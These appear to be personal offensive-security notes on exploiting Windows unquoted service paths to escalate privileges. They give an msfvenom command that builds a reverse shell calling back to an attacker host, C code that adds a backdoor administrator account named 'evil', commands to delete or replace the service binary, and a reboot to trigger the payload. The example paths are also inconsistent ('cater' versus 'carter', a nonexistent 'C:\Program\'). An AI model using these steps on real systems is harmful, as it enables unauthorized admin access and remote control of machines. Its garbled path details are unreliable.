# Unquoted Service Path Attack

### Identify a writable directory where the target file is located

- ***If the target file is located in `C:\Program Files\cater\cater_term.exe` we should see if the following a writable:***

1. `C:\`, if this is writable we would name the payload `Program.exe`
2. `C:\Program\`, if this is writable we would name the payload `Files.exe`
3. `C:\Program Files\`, if this is writable we would name the payload `carter.exe`
4. `C:\Program Files\carter\`, if this is writable we would name the payload `carter_term.exe` and delete/rename the original `carter_term.exe`

- ***Steps to rename/delete the file so we can replace it:***

1. Rename: `Rename-Item -Path "C:\<Full Path\<File Name>" -NewName "C:\<Full Path\<New Name>"`
2. Delete" `Remove-Item -Path "C:\<Full Path\<File Name>"` and for recusive, add a `-recurse`

- ***Creating the payload:***

1. Create a reverse shell executable with msfvenom `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe`
2. Create a new administrator account with some compiled C code and use `gcc <program.c> -o <executable name.exe>` to compile it
```
    #include <stdlib.h>
    int main ()
    {
      int i;
      
      i = system ("net user evil Ev!lpass /add");
      i = system ("net localgroup administrators evil /add");
      
      return 0;
    }
```
- ***Execution:***

1. Once payload is in position, and any other listeners are set up, execute `Restart-Computer` to restart the computer and either created a new admin or got an admin shell.
